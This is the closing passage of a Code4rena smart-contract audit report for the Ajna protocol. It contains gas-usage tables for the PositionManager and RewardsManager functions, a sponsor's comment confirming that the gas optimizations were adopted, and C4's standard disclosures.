| burn                                             | 1408            | 4679   | 5632   | 8524    | 12      |
| getLP                                            | 5659            | 7969   | 7200   | 35334   | 229     |
| getPositionIndexes                               | 1323            | 1921   | 1793   | 3439    | 165     |
| getPositionIndexesFiltered                       | 8165            | 27877  | 23937  | 71401   | 222     |
| getPositionInfo                                  | 784             | 784    | 784    | 784     | 4       |
| isIndexInPosition                                | 679             | 1242   | 679    | 2679    | 71      |
| isPositionBucketBankrupt                         | 5832            | 6624   | 6820   | 7011    | 6       |
| memorializePositions                             | 17751           | 324318 | 252840 | 1133268 | 58      |
| mint                                             | 8013            | 87149  | 92653  | 97653   | 63      |
| moveLiquidity                                    | 5864            | 237889 | 239056 | 675854  | 19      |
| ownerOf                                          | 580             | 580    | 580    | 599     | 119     |
| permit                                           | 618             | 12225  | 5865   | 32554   | 7       |
| poolKey                                          | 523             | 523    | 523    | 523     | 36      |
| reedemPositions                                  | 2834            | 37754  | 25381  | 139605  | 24      |
| safeTransferFrom                                 | 21520           | 22920  | 23320  | 23520   | 4       |
| tokenURI                                         | 2490            | 466347 | 466347 | 930205  | 2       |
| transferFrom(address,address,uint256)            | 5956            | 18817  | 23476  | 24573   | 12      |
| transferFrom(address,address,uint256)(bool)      | 5956            | 17097  | 19659  | 24573   | 38      |


| src/RewardsManager.sol:RewardsManager contract |                 |         |         |         |         |
|------------------------------------------------|-----------------|---------|---------|---------|---------|
| Deployment Cost                                | Deployment Size |         |         |         |         |
| 1915540                                        | 9863            |         |         |         |         |
| Function Name                                  | min             | avg     | median  | max     | # calls |
| calculateRewards                               | 33122           | 47963   | 36928   | 153466  | 106     |
| claimRewards                                   | 523             | 118708  | 102613  | 381560  | 109     |
| getBucketStateStakeInfo                        | 677             | 2675    | 2677    | 2677    | 81279   |
| getStakeInfo                                   | 694             | 694     | 694     | 694     | 137     |
| moveStakedLiquidity                            | 1856519         | 1968777 | 1968777 | 2081035 | 2       |
| stake                                          | 118532          | 374112  | 395151  | 890632  | 34      |
| unstake                                        | 95782           | 177074  | 140013  | 395455  | 13      |
| updateBucketExchangeRatesAndClaim              | 9593            | 242537  | 174985  | 535123  | 42      |
```

**[MikeHathaway (Ajna) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/284#issuecomment-1574481774):**
 > This report was extremely helpful. We've adopted many of the gas optimizations, and have verified that the provided gas savings estimates were generally accurate.



***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
